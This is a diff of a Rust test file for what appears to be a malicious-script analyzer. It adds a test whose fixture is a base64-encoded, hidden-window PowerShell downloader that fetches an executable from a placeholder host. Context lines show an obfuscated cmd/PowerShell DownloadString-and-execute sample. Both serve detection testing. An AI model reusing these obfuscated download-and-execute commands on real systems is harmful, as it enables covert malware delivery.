@@ -28944,6 +28944,32 @@ Invoke-WebRequest -Uri $url -OutFile $outputPath
     }
 
     #[test]
+    fn encoded_iwr_outfile_variable_destination_is_resolved() {
+        let payload = r#"$url = "https://biteblob.example/Download/build.exe"
+$file = "$env:TEMP\file.exe"
+Invoke-WebRequest -Uri $url -OutFile $file
+"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
+        let script = format!(
+            r#"powershell.exe -NoProfile -WindowStyle Hidden -Command "Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{b64}')))""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://biteblob.example/Download/build.exe"
+                        && dst.as_deref()
+                            == Some("C:\\Users\\puncher\\AppData\\Local\\Temp\\file.exe")
+            )
+        });
+        assert!(
+            has,
+            "encoded IWR -OutFile variable destination was not resolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmd_marker_mangled_powershell_downloadstring_url_extracted() {
         let script = r#"SET A=E
 POW%!A%RSH%!A%LL.%!A%X%!A% -N^O^P -%!A%X%!A%C B^YPA^SS -NO^NI [BYT%!A%[]];$XCZM='I%!A%X(N%!A%W-OBJ%!A%CT N%!A%T.W';$SYWD='%!A%BCLI%!A%NT).DOWNLO';$VFDR='TUUL(''https://payload.example/a.png'')'.R%!A%PLAC%!A%('TUUL','ADSTRING');I%!A%X($XCZM+$SYWD+$VFDR)
